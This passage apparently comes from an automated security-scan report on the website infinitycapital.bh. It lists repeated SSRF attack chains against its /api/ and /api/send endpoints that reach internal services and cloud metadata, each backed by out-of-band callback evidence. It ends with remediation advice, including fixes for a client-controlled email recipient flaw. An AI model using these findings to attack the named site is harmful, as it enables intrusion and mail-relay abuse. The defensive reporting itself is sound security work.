  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`

## Remediation (grouped by root cause)
- **ssrf** (5)
- **nosqli** (2)
- **sqli** (1)
- **xxe** (1)
- **business_logic** (1) — 1) Never accept the destination address from the client. Hardcode the recipient server-side (e.g. `to: 'info@infinitycapital.bh'`) and delete the `targets` field from the request handler, so the client cannot influence the envelope recipient at all.
2) If dynamic recipients are genuinely required, validate against a strict server-side allowlist of permitted addresses/domains before calling the provider.
3) Enforce a real anti-automation control: the `check` honeypot must REJECT submissions when present (currently it is accepted, so it provides zero protection). Add rate limiting per IP and per session on /api/send, plus a CAPTCHA/Turnstile for anonymous submissions.
4) Enforce a server-side message size cap (100kB body was accepted) and reject unknown/extra fields (from/replyTo/bcc) rather than passing them through.
5) Add email-authentication alignment (SPF/DKIM/DMARC) and monitor Resend sending volume so relay abuse is detected and the sending domain cannot be used for spam.
- **security_headers** (1)
- **protocol** (1)
